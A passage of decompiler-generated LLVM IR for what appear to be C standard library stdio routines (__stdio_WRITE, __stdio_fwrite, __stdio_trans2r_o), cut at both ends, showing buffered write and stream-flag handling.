  %v3_806179c = or i16 %v2_80617a2, 4
  store i16 %v3_806179c, i16* %v1_80617a2, align 2
  %v0_80617ab.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80617a8

dec_label_pc_80617a2:                             ; preds = %dec_label_pc_806179a
  %v3_80617a2 = or i16 %v2_80617a2, 8
  store i16 %v3_80617a2, i16* %v1_80617a2, align 2
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80617a8

dec_label_pc_80617a8:                             ; preds = %dec_label_pc_8061784, %entry, %dec_label_pc_806179c, %dec_label_pc_80617a2
  %v0_80617ab = phi i32 [ %v3_806178d, %dec_label_pc_8061784 ], [ 0, %entry ], [ %v0_80617ab.pre, %dec_label_pc_806179c ], [ 0, %dec_label_pc_80617a2 ]
  %v2_80617aa = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80617aa, i32* @ebx, align 4
  ret i32 %v0_80617ab

; uselistorder directives
  uselistorder i16 %v2_80617a2, { 1, 0 }
  uselistorder i32 %v3_806178d, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32, i32)* @__libc_read, { 0, 5, 4, 1, 3, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80617a8, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8061784, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %v0_80617ac = load i32, i32* @ebp, align 4
  %v0_80617ad = load i32, i32* @edi, align 4
  %v0_80617ae = load i32, i32* @esi, align 4
  %v0_80617af = load i32, i32* @ebx, align 4
  %v4_80617b3 = ptrtoint i16* %arg1 to i32
  store i32 %v4_80617b3, i32* @edi, align 4
  store i32 %arg2, i32* @esi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_80617bf4 = icmp eq i32 %arg3, 0
  br i1 %v1_80617bf4, label %dec_label_pc_806181e, label %dec_label_pc_80617c4.lr.ph

dec_label_pc_80617c4.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_80617c4

dec_label_pc_80617c4:                             ; preds = %dec_label_pc_80617e3.dec_label_pc_80617c4_crit_edge, %dec_label_pc_80617c4.lr.ph
  %v0_80617d4 = phi i32 [ %v4_80617b3, %dec_label_pc_80617c4.lr.ph ], [ %v0_80617d4.pre, %dec_label_pc_80617e3.dec_label_pc_80617c4_crit_edge ]
  %v0_80617d3 = phi i32 [ %arg2, %dec_label_pc_80617c4.lr.ph ], [ %v2_80617e5, %dec_label_pc_80617e3.dec_label_pc_80617c4_crit_edge ]
  %v0_80617c6.in = phi i32 [ %arg3, %dec_label_pc_80617c4.lr.ph ], [ %v2_80617e3, %dec_label_pc_80617e3.dec_label_pc_80617c4_crit_edge ]
  %v0_80617c6 = icmp slt i32 %v0_80617c6.in, 0
  store i32 %v0_80617c6.in, i32* @ebp, align 4
  %v2_80617c6 = icmp eq i1 %v0_80617c6, false
  %storemerge = select i1 %v2_80617c6, i32 %v0_80617c6.in, i32 2147483647
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_80617d4 = add i32 %v0_80617d4, 4
  %v2_80617d4 = inttoptr i32 %v1_80617d4 to i32*
  %v3_80617d4 = load i32, i32* %v2_80617d4, align 4
  %v4_80617d7 = call i32 @__libc_write(i32 %v3_80617d4, i32 %v0_80617d3, i32 %storemerge)
  store i32 %v4_80617d7, i32* %eax.global-to-local, align 4
  %v2_80617df = icmp slt i32 %v4_80617d7, 0
  br i1 %v2_80617df, label %dec_label_pc_80617e9, label %dec_label_pc_80617e3

dec_label_pc_80617e3:                             ; preds = %dec_label_pc_80617c4
  %v0_80617e3 = load i32, i32* @ebx, align 4
  %v2_80617e3 = sub i32 %v0_80617e3, %v4_80617d7
  %v12_80617e3 = icmp eq i32 %v2_80617e3, 0
  store i32 %v2_80617e3, i32* @ebx, align 4
  %v0_80617e5 = load i32, i32* @esi, align 4
  %v2_80617e5 = add i32 %v0_80617e5, %v4_80617d7
  store i32 %v2_80617e5, i32* @esi, align 4
  br i1 %v12_80617e3, label %dec_label_pc_806181e, label %dec_label_pc_80617e3.dec_label_pc_80617c4_crit_edge

dec_label_pc_80617e3.dec_label_pc_80617c4_crit_edge: ; preds = %dec_label_pc_80617e3
  %v0_80617d4.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80617c4

dec_label_pc_80617e9:                             ; preds = %dec_label_pc_80617c4
  %v0_80617e9 = load i32, i32* @edi, align 4
  %v1_80617e9 = add i32 %v0_80617e9, 8
  %v2_80617e9 = inttoptr i32 %v1_80617e9 to i32*
  %v3_80617e9 = load i32, i32* %v2_80617e9, align 4
  store i32 %v3_80617e9, i32* @edx, align 4
  %v1_80617ec = add i32 %v0_80617e9, 12
  %v2_80617ec = inttoptr i32 %v1_80617ec to i32*
  %v3_80617ec = load i32, i32* %v2_80617ec, align 4
  store i32 %v3_80617ec, i32* %eax.global-to-local, align 4
  %v1_80617ef = inttoptr i32 %v0_80617e9 to i16*
  %v2_80617ef = load i16, i16* %v1_80617ef, align 2
  %v3_80617ef = or i16 %v2_80617ef, 8
  store i16 %v3_80617ef, i16* %v1_80617ef, align 2
  %v0_80617f3 = load i32, i32* %eax.global-to-local, align 4
  %v1_80617f3 = load i32, i32* @edx, align 4
  %v2_80617f3 = sub i32 %v0_80617f3, %v1_80617f3
  %v12_80617f3 = icmp eq i32 %v2_80617f3, 0
  store i32 %v2_80617f3, i32* %eax.global-to-local, align 4
  %v4_806181a.pre = load i32, i32* @ebx, align 4
  br i1 %v12_80617f3, label %dec_label_pc_806181a, label %dec_label_pc_80617f7

dec_label_pc_80617f7:                             ; preds = %dec_label_pc_80617e9
  %v6_80617f9 = icmp ugt i32 %v2_80617f3, %v4_806181a.pre
  br i1 %v6_80617f9, label %dec_label_pc_80617fd.preheader, label %dec_label_pc_80617fb

dec_label_pc_80617fb:                             ; preds = %dec_label_pc_80617f7
  store i32 %v2_80617f3, i32* @ebp, align 4
  br label %dec_label_pc_80617fd.preheader

dec_label_pc_80617fd.preheader:                   ; preds = %dec_label_pc_80617fb, %dec_label_pc_80617f7
  %v0_80617fd.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80617fd

dec_label_pc_80617fd:                             ; preds = %dec_label_pc_80617fd.preheader, %dec_label_pc_806180f
  %v2_80617ff = phi i32 [ %v1_80617f3, %dec_label_pc_80617fd.preheader ], [ %v1_806180b, %dec_label_pc_806180f ]
  %v4_80617fd = phi i32 [ %v2_80617f3, %dec_label_pc_80617fd.preheader ], [ %v0_8061801, %dec_label_pc_806180f ]
  %v0_80617fd = phi i32 [ %v0_80617fd.pre, %dec_label_pc_80617fd.preheader ], [ %v1_806180f, %dec_label_pc_806180f ]
  %v1_80617fd = inttoptr i32 %v0_80617fd to i8*
  %v2_80617fd = load i8, i8* %v1_80617fd, align 1
  %v3_80617fd = zext i8 %v2_80617fd to i32
  %v5_80617fd = and i32 %v4_80617fd, -256
  %v6_80617fd = or i32 %v3_80617fd, %v5_80617fd
  store i32 %v6_80617fd, i32* %eax.global-to-local, align 4
  %v3_80617ff = inttoptr i32 %v2_80617ff to i8*
  store i8 %v2_80617fd, i8* %v3_80617ff, align 1
  %v0_8061801 = load i32, i32* %eax.global-to-local, align 4
  %v1_8061801 = trunc i32 %v0_8061801 to i8
  %v10_8061801 = icmp eq i8 %v1_8061801, 10
  %v1_8061803 = icmp eq i1 %v10_8061801, false
  br i1 %v1_8061803, label %dec_label_pc_806180b, label %dec_label_pc_8061805

dec_label_pc_8061805:                             ; preds = %dec_label_pc_80617fd
  %v0_8061805 = load i32, i32* @edi, align 4
  %v1_8061805 = add i32 %v0_8061805, 1
  %v2_8061805 = inttoptr i32 %v1_8061805 to i8*
  %v3_8061805 = load i8, i8* %v2_8061805, align 1
  %v4_8061805 = urem i8 %v3_8061805, 2
  %v5_8061805 = icmp eq i8 %v4_8061805, 0
  %v1_8061809 = icmp eq i1 %v5_8061805, false
  br i1 %v1_8061809, label %dec_label_pc_8061805.dec_label_pc_8061812_crit_edge, label %dec_label_pc_806180b

dec_label_pc_8061805.dec_label_pc_8061812_crit_edge: ; preds = %dec_label_pc_8061805
  %v0_8061812.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8061812

dec_label_pc_806180b:                             ; preds = %dec_label_pc_8061805, %dec_label_pc_80617fd
  %v0_806180b = load i32, i32* @edx, align 4
  %v1_806180b = add i32 %v0_806180b, 1
  store i32 %v1_806180b, i32* @edx, align 4
  %v0_806180c = load i32, i32* @ebp, align 4
  %v1_806180c = add i32 %v0_806180c, -1
  %v8_806180c = icmp eq i32 %v1_806180c, 0
  store i32 %v1_806180c, i32* @ebp, align 4
  br i1 %v8_806180c, label %dec_label_pc_806180b.dec_label_pc_8061812_crit_edge, label %dec_label_pc_806180f

dec_label_pc_806180b.dec_label_pc_8061812_crit_edge: ; preds = %dec_label_pc_806180b
  %v1_8061812.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8061812

dec_label_pc_806180f:                             ; preds = %dec_label_pc_806180b
  %v0_806180f = load i32, i32* @esi, align 4
  %v1_806180f = add i32 %v0_806180f, 1
  store i32 %v1_806180f, i32* @esi, align 4
  br label %dec_label_pc_80617fd

dec_label_pc_8061812:                             ; preds = %dec_label_pc_806180b.dec_label_pc_8061812_crit_edge, %dec_label_pc_8061805.dec_label_pc_8061812_crit_edge
  %v1_8061812 = phi i32 [ %v0_8061805, %dec_label_pc_8061805.dec_label_pc_8061812_crit_edge ], [ %v1_8061812.pre, %dec_label_pc_806180b.dec_label_pc_8061812_crit_edge ]
  %v0_8061812 = phi i32 [ %v0_8061812.pre, %dec_label_pc_8061805.dec_label_pc_8061812_crit_edge ], [ %v1_806180b, %dec_label_pc_806180b.dec_label_pc_8061812_crit_edge ]
  %v2_8061812 = add i32 %v1_8061812, 16
  %v3_8061812 = inttoptr i32 %v2_8061812 to i32*
  store i32 %v0_8061812, i32* %v3_8061812, align 4
  %v0_8061815 = load i32, i32* @edx, align 4
  %v1_8061815 = load i32, i32* @edi, align 4
  %v2_8061815 = add i32 %v1_8061815, 8
  %v3_8061815 = inttoptr i32 %v2_8061815 to i32*
  %v4_8061815 = load i32, i32* %v3_8061815, align 4
  %v5_8061815 = sub i32 %v0_8061815, %v4_8061815
  store i32 %v5_8061815, i32* @edx, align 4
  %v0_8061818 = load i32, i32* @ebx, align 4
  %v2_8061818 = sub i32 %v0_8061818, %v5_8061815
  br label %dec_label_pc_806181a

dec_label_pc_806181a:                             ; preds = %dec_label_pc_80617e9, %dec_label_pc_8061812
  %v4_806181a = phi i32 [ %v2_8061818, %dec_label_pc_8061812 ], [ %v4_806181a.pre, %dec_label_pc_80617e9 ]
  %v5_806181a = sub i32 %arg3, %v4_806181a
  br label %dec_label_pc_806181e

dec_label_pc_806181e:                             ; preds = %dec_label_pc_80617e3, %entry, %dec_label_pc_806181a
  %stack_var_12.0 = phi i32 [ %v5_806181a, %dec_label_pc_806181a ], [ 0, %entry ], [ %arg3, %dec_label_pc_80617e3 ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  store i32 %v0_80617af, i32* @ebx, align 4
  store i32 %v0_80617ae, i32* @esi, align 4
  store i32 %v0_80617ad, i32* @edi, align 4
  store i32 %v0_80617ac, i32* @ebp, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_806180f, { 1, 0 }
  uselistorder i32 %v1_806180c, { 1, 0 }
  uselistorder i32 %v1_806180b, { 0, 2, 1 }
  uselistorder i32 %v0_8061801, { 1, 0 }
  uselistorder i32 %v2_80617e5, { 1, 0 }
  uselistorder i32 %v2_80617e3, { 1, 2, 0 }
  uselistorder i32 %v4_80617d7, { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @__libc_write, { 2, 11, 10, 5, 4, 9, 3, 8, 12, 7, 6, 1, 0 }
  uselistorder i32 2147483647, { 3, 1, 2, 4, 0 }
  uselistorder i32 %arg3, { 0, 3, 1, 2, 4 }
  uselistorder label %dec_label_pc_806181e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_806181a, { 1, 0 }
  uselistorder label %dec_label_pc_80617fd, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_806182c = load i32, i32* @ebp, align 4
  %v0_806182d = load i32, i32* @edi, align 4
  %v0_806182e = load i32, i32* @esi, align 4
  %v0_806182f = load i32, i32* @ebx, align 4
  store i32 %v0_806182f, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @ebx, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_806183f = add i32 %arg3, 1
  %v2_806183f = inttoptr i32 %v1_806183f to i8*
  %v3_806183f = load i8, i8* %v2_806183f, align 1
  %v4_806183f = and i8 %v3_806183f, 2
  %v5_806183f = icmp eq i8 %v4_806183f, 0
  %v1_8061843 = icmp eq i1 %v5_806183f, false
  br i1 %v1_8061843, label %dec_label_pc_80618fa, label %dec_label_pc_8061849

dec_label_pc_8061849:                             ; preds = %entry
  %v1_8061849 = add i32 %arg3, 4
  %v2_8061849 = inttoptr i32 %v1_8061849 to i32*
  %v3_8061849 = load i32, i32* %v2_8061849, align 4
  %v13_8061849 = icmp eq i32 %v3_8061849, -2
  %v1_806184d = add i32 %arg3, 16
  %v2_806184d = inttoptr i32 %v1_806184d to i32*
  %v3_806184d = load i32, i32* %v2_806184d, align 4
  store i32 %v3_806184d, i32* @edx, align 4
  %v1_8061850 = add i32 %arg3, 12
  %v2_8061850 = inttoptr i32 %v1_8061850 to i32*
  %v3_8061850 = load i32, i32* %v2_8061850, align 4
  %v1_8061853 = icmp eq i1 %v13_8061849, false
  %v2_8061873 = sub i32 %v3_8061850, %v3_806184d
  store i32 %v2_8061873, i32* %eax.global-to-local, align 4
  br i1 %v1_8061853, label %dec_label_pc_8061873, label %dec_label_pc_8061855

dec_label_pc_8061855:                             ; preds = %dec_label_pc_8061849
  %tmp = icmp ult i32 %v2_8061873, %arg2
  br i1 %tmp, label %dec_label_pc_806185d, label %dec_label_pc_806185f

dec_label_pc_806185d:                             ; preds = %dec_label_pc_8061855
  br label %dec_label_pc_806185f

dec_label_pc_806185f:                             ; preds = %dec_label_pc_8061855, %dec_label_pc_806185d
  %storemerge = phi i32 [ %v2_8061873, %dec_label_pc_806185d ], [ %arg2, %dec_label_pc_8061855 ]
  %v0_8061860 = phi i32 [ %v2_8061873, %dec_label_pc_806185d ], [ %arg2, %dec_label_pc_8061855 ]
  store i32 %storemerge, i32* @esi, align 4
  %v3_8061863 = inttoptr i32 %v3_806184d to i16*
  %v4_8061863 = call i32 @memcpy(i16* %v3_8061863, i32 %v0_8061860, i32 %v2_8061873)
  store i32 %v4_8061863, i32* %eax.global-to-local, align 4
  %v0_8061868 = load i32, i32* @ebx, align 4
  %v1_8061868 = add i32 %v0_8061868, 16
  %v2_8061868 = inttoptr i32 %v1_8061868 to i32*
  %v3_8061868 = load i32, i32* %v2_8061868, align 4
  %v4_8061868 = load i32, i32* @esi, align 4
  %v5_8061868 = add i32 %v4_8061868, %v3_8061868
  store i32 %v5_8061868, i32* %v2_8061868, align 4
  br label %dec_label_pc_8061912

dec_label_pc_8061873:                             ; preds = %dec_label_pc_8061849
  %v6_8061877 = icmp ult i32 %v2_8061873, %arg2
  br i1 %v6_8061877, label %dec_label_pc_80618e1, label %dec_label_pc_8061879

dec_label_pc_8061879:                             ; preds = %dec_label_pc_8061873
  %v0_8061879 = load i32, i32* @ecx, align 4
  %v3_806187d = inttoptr i32 %v3_806184d to i16*
  %v4_806187d = call i32 @memcpy(i16* %v3_806187d, i32 %arg2, i32 %v0_8061879)
  store i32 %v4_806187d, i32* %eax.global-to-local, align 4
  %v0_8061882 = load i32, i32* @ebx, align 4
  %v1_8061882 = add i32 %v0_8061882, 16
  %v2_8061882 = inttoptr i32 %v1_8061882 to i32*
  %v3_8061882 = load i32, i32* %v2_8061882, align 4
  %v4_8061882 = load i32, i32* @edi, align 4
  %v5_8061882 = add i32 %v4_8061882, %v3_8061882
  store i32 %v5_8061882, i32* %v2_8061882, align 4
  %v0_8061888 = load i32, i32* @ebx, align 4
  %v1_8061888 = add i32 %v0_8061888, 1
  %v2_8061888 = inttoptr i32 %v1_8061888 to i8*
  %v3_8061888 = load i8, i8* %v2_8061888, align 1
  %v4_8061888 = urem i8 %v3_8061888, 2
  %v5_8061888 = icmp eq i8 %v4_8061888, 0
  br i1 %v5_8061888, label %dec_label_pc_8061912, label %dec_label_pc_8061892

dec_label_pc_8061892:                             ; preds = %dec_label_pc_8061879
  %v0_8061892 = load i32, i32* @edx, align 4
  %v0_8061893 = load i32, i32* @edi, align 4
  %v4_8061897 = call i32 @memrchr(i8 10, i32 %v0_8061893, i32 %v0_8061892)
  store i32 %v4_8061897, i32* %eax.global-to-local, align 4
  %v1_806189f = icmp eq i32 %v4_8061897, 0
  br i1 %v1_806189f, label %dec_label_pc_8061912, label %dec_label_pc_80618a3

dec_label_pc_80618a3:                             ; preds = %dec_label_pc_8061892
  %v0_80618a6 = load i32, i32* @ebx, align 4
  %v1_80618a7 = call i32 @__stdio_wcommit(i32 %v0_80618a6)
  store i32 %v1_80618a7, i32* %eax.global-to-local, align 4
  %v1_80618af = icmp eq i32 %v1_80618a7, 0
  br i1 %v1_80618af, label %dec_label_pc_8061912, label %dec_label_pc_80618b3

dec_label_pc_80618b3:                             ; preds = %dec_label_pc_80618a3
  %v0_80618b3 = load i32, i32* @edi, align 4
  %tmp23 = icmp ugt i32 %v0_80618b3, %v1_80618a7
  br i1 %tmp23, label %dec_label_pc_80618b9, label %dec_label_pc_80618bb

dec_label_pc_80618b9:                             ; preds = %dec_label_pc_80618b3
  br label %dec_label_pc_80618bb

dec_label_pc_80618bb:                             ; preds = %dec_label_pc_80618b3, %dec_label_pc_80618b9
  %storemerge22 = phi i32 [ %v1_80618a7, %dec_label_pc_80618b9 ], [ %v0_80618b3, %dec_label_pc_80618b3 ]
  %v0_80618c2 = phi i32 [ %v1_80618a7, %dec_label_pc_80618b9 ], [ %v0_80618b3, %dec_label_pc_80618b3 ]
  store i32 %storemerge22, i32* %esi.global-to-local, align 4
  %v2_80618bd = sub i32 %v0_80618b3, %v0_80618c2
  store i32 %v2_80618bd, i32* %eax.global-to-local, align 4
  %v0_80618bf = load i32, i32* @ebp, align 4
  %v2_80618bf = add i32 %v0_80618bf, %v2_80618bd
  store i32 %v2_80618bf, i32* %ebp.global-to-local, align 4
  %v4_80618c6 = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v0_80618c2, i32 %v2_80618bd)
  store i32 %v4_80618c6, i32* %eax.global-to-local, align 4
  store i32 %v4_80618c6, i32* @edx, align 4
  %v1_80618d0 = icmp eq i32 %v4_80618c6, 0
  br i1 %v1_80618d0, label %dec_label_pc_8061912, label %dec_label_pc_80618d4

dec_label_pc_80618d4:                             ; preds = %dec_label_pc_80618bb
  %v0_80618d4 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80618d4 = load i32, i32* %esi.global-to-local, align 4
  %v2_80618d4 = sub i32 %v0_80618d4, %v4_80618c6
  %v2_80618d8 = add i32 %v2_80618d4, %v1_80618d4
  store i32 %v2_80618d8, i32* %eax.global-to-local, align 4
  %v0_80618da = load i32, i32* @ebx, align 4
  %v1_80618da = add i32 %v0_80618da, 16
  %v2_80618da = inttoptr i32 %v1_80618da to i32*
  %v3_80618da = load i32, i32* %v2_80618da, align 4
  %v5_80618da = sub i32 %v3_80618da, %v2_80618d8
  store i32 %v5_80618da, i32* %v2_80618da, align 4
  %v0_80618dd = load i32, i32* @edi, align 4
  %v1_80618dd = load i32, i32* %eax.global-to-local, align 4
  %v2_80618dd = sub i32 %v0_80618dd, %v1_80618dd
  store i32 %v2_80618dd, i32* @edi, align 4
  br label %dec_label_pc_8061912

dec_label_pc_80618e1:                             ; preds = %dec_label_pc_8061873
  %v2_80618e1 = add i32 %arg3, 8
  %v3_80618e1 = inttoptr i32 %v2_80618e1 to i32*
  %v4_80618e1 = load i32, i32* %v3_80618e1, align 4
  %v15_80618e1 = icmp eq i32 %v3_806184d, %v4_80618e1
  br i1 %v15_80618e1, label %dec_label_pc_80618fa, label %dec_label_pc_80618e6

dec_label_pc_80618e6:                             ; preds = %dec_label_pc_80618e1
  %v1_80618ea = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_80618ea, i32* %eax.global-to-local, align 4
  %v1_80618f2 = icmp eq i32 %v1_80618ea, 0
  br i1 %v1_80618f2, label %dec_label_pc_80618e6.dec_label_pc_80618fa_crit_edge, label %dec_label_pc_80618f6

dec_label_pc_80618e6.dec_label_pc_80618fa_crit_edge: ; preds = %dec_label_pc_80618e6
  %v0_80618fa.pre = load i32, i32* @edi, align 4
  %v0_8061902.pre = load i32, i32* @ebx, align 4
  %v2_8061909.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_80618fa

dec_label_pc_80618f6:                             ; preds = %dec_label_pc_80618e6
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8061912

dec_label_pc_80618fa:                             ; preds = %dec_label_pc_80618e6.dec_label_pc_80618fa_crit_edge, %dec_label_pc_80618e1, %entry
  %v2_8061909 = phi i32 [ %v2_8061909.pre, %dec_label_pc_80618e6.dec_label_pc_80618fa_crit_edge ], [ %v0_806182f, %dec_label_pc_80618e1 ], [ %v0_806182f, %entry ]
  %v0_8061902 = phi i32 [ %v0_8061902.pre, %dec_label_pc_80618e6.dec_label_pc_80618fa_crit_edge ], [ %arg3, %dec_label_pc_80618e1 ], [ %arg3, %entry ]
  %v0_80618fa = phi i32 [ %v0_80618fa.pre, %dec_label_pc_80618e6.dec_label_pc_80618fa_crit_edge ], [ %arg2, %dec_label_pc_80618e1 ], [ %arg2, %entry ]
  store i32 %v2_8061909, i32* @ebx, align 4
  store i32 %v0_806182e, i32* @esi, align 4
  store i32 %v0_806182d, i32* @edi, align 4
  store i32 %v0_806182c, i32* @ebp, align 4
  %v4_806190d = inttoptr i32 %v0_8061902 to i16*
  %v5_806190d = call i32 @__stdio_WRITE(i16* %v4_806190d, i32 %v0_80618fa, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_806190d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8061912

dec_label_pc_8061912:                             ; preds = %dec_label_pc_80618bb, %dec_label_pc_80618a3, %dec_label_pc_8061892, %dec_label_pc_8061879, %dec_label_pc_80618f6, %dec_label_pc_80618d4, %dec_label_pc_806185f, %dec_label_pc_80618fa
  %v0_8061915 = load i32, i32* @edi, align 4
  store i32 %v0_8061915, i32* %eax.global-to-local, align 4
  %v2_8061917 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8061917, i32* @ebx, align 4
  store i32 %v0_806182e, i32* @esi, align 4
  store i32 %v0_806182d, i32* @edi, align 4
  store i32 %v0_806182c, i32* @ebp, align 4
  ret i32 %v0_8061915

; uselistorder directives
  uselistorder i32 %v2_80618d8, { 1, 0 }
  uselistorder i32 %v4_80618c6, { 0, 2, 1, 3 }
  uselistorder i32 %v2_80618bd, { 1, 0, 2 }
  uselistorder i32 %v0_80618b3, { 3, 0, 1, 2 }
  uselistorder i32 %v2_8061873, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 %v0_806182e, { 1, 0 }
  uselistorder i32 %v0_806182d, { 1, 0 }
  uselistorder i32 %v0_806182c, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 4, 5, 6, 3, 0, 1, 2, 7 }
  uselistorder label %dec_label_pc_8061912, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_80618bb, { 1, 0 }
  uselistorder label %dec_label_pc_806185f, { 1, 0 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_806191c = load i32, i32* @ebx, align 4
  %v4_8061920 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8061920, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_8061928 = bitcast i16* %arg1 to i32*
  %v2_8061928 = load i32, i32* %v1_8061928, align 4
  %v1_806192a = urem i32 %v2_8061928, 65536
  %v2_806192d = and i32 %v1_806192a, %arg2
  %v3_806192d = icmp eq i32 %v2_806192d, 0
  %v1_806192f = icmp eq i1 %v3_806192d, false
  br i1 %v1_806192f, label %dec_label_pc_806193e, label %dec_label_pc_8061931

dec_label_pc_8061931:                             ; preds = %entry
  %v1_8061931 = and i32 %v2_8061928, 2176
  %v2_8061931 = icmp eq i32 %v1_8061931, 0
  %v1_8061937 = icmp eq i1 %v2_8061931, false
  br i1 %v1_8061937, label %dec_label_pc_8061945, label %dec_label_pc_8061939

dec_label_pc_8061939:                             ; preds = %dec_label_pc_8061931
  %v2_8061939 = or i32 %v2_8061928, %arg2
  %v1_806193b = trunc i32 %v2_8061939 to i16
  store i16 %v1_806193b, i16* %arg1, align 2
  %v0_806193e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_806193e

dec_label_pc_806193e:                             ; preds = %entry, %dec_label_pc_8061939
  %v0_8061960 = phi i32 [ %v4_8061920, %entry ], [ %v0_806193e.pre, %dec_label_pc_8061939 ]
  %v1_806193e = inttoptr i32 %v0_8061960 to i16*
  %v2_806193e = load i16, i16* %v1_806193e, align 2
  %v2_8061941 = and i16 %v2_806193e, 16
  %v3_8061941 = icmp eq i16 %v2_8061941, 0
  br i1 %v3_8061941, label %dec_label_pc_8061959, label %dec_label_pc_8061945

dec_label_pc_8061945:                             ; preds = %dec_label_pc_806193e, %dec_label_pc_8061931
  %v1_8061945 = call i32 @__errno_location(i32 %v0_806191c)
  %v1_806194a = inttoptr i32 %v1_8061945 to i32*
  store i32 9, i32* %v1_806194a, align 4
  br label %dec_label_pc_8061950

dec_label_pc_8061950:                             ; preds = %dec_label_pc_806195d, %dec_label_pc_8061945
  %v0_8061950 = load i32, i32* @ebx, align 4
  %v1_8061950 = inttoptr i32 %v0_8061950 to i16*
  %v2_8061950 = load i16, i16* %v1_8061950, align 2
  %v3_8061950 = or i16 %v2_8061950, 8
  store i16 %v3_8061950, i16* %v1_8061950, align 2
  br label %dec_label_pc_806197d

dec_label_pc_8061959:                             ; preds = %dec_label_pc_806193e
  %v2_8061959 = and i16 %v2_806193e, 64
  %v3_8061959 = icmp eq i16 %v2_8061959, 0
  br i1 %v3_8061959, label %dec_label_pc_8061977, label %dec_label_pc_806195d

dec_label_pc_806195d:                             ; preds = %dec_label_pc_8061959
  %v2_8061961 = call i32 @__stdio_wcommit(i32 %v0_8061960)
  %v1_8061969 = icmp eq i32 %v2_8061961, 0
  %v1_806196b = icmp eq i1 %v1_8061969, false
  br i1 %v1_806196b, label %dec_label_pc_8061950, label %dec_label_pc_806196d

dec_label_pc_806196d:                             ; preds = %dec_label_pc_806195d
  %v0_806196d = load i32, i32* @ebx, align 4
  %v1_806196d = inttoptr i32 %v0_806196d to i16*
  %v2_806196d = load i16, i16* %v1_806196d, align 2
  %v3_806196d = and i16 %v2_806196d, -65
  store i16 %v3_806196d, i16* %v1_806196d, align 2
  %v0_8061971 = load i32, i32* @ebx, align 4
  %v1_8061971 = add i32 %v0_8061971, 8
  %v2_8061971 = inttoptr i32 %v1_8061971 to i32*
  %v3_8061971 = load i32, i32* %v2_8061971, align 4
  %v2_8061974 = add i32 %v0_8061971, 28
  %v3_8061974 = inttoptr i32 %v2_8061974 to i32*
  store i32 %v3_8061971, i32* %v3_8061974, align 4
  %v0_8061977.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8061977

dec_label_pc_8061977:                             ; preds = %dec_label_pc_8061959, %dec_label_pc_806196d
  %v9_8061977 = phi i32 [ %v0_8061960, %dec_label_pc_8061959 ], [ %v0_8061977.pre, %dec_label_pc_806196d ]
  %v1_8061977 = inttoptr i32 %v9_8061977 to i16*
  %v2_8061977 = load i16, i16* %v1_8061977, align 2
  %v3_8061977 = or i16 %v2_8061977, 1
  store i16 %v3_8061977, i16* %v1_8061977, align 2
  br label %dec_label_pc_806197d

dec_label_pc_806197d:                             ; preds = %dec_label_pc_8061950, %dec_label_pc_8061977
  %storemerge = phi i32 [ 0, %dec_label_pc_8061977 ], [ -1, %dec_label_pc_8061950 ]
  store i32 %v0_806191c, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_8061928, { 1, 2, 0 }
  uselistorder i32 %v0_806191c, { 1, 0 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_806197d, { 1, 0 }
  uselistorder label %dec_label_pc_8061977, { 1, 0 }
  uselistorder label %dec_label_pc_806193e, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
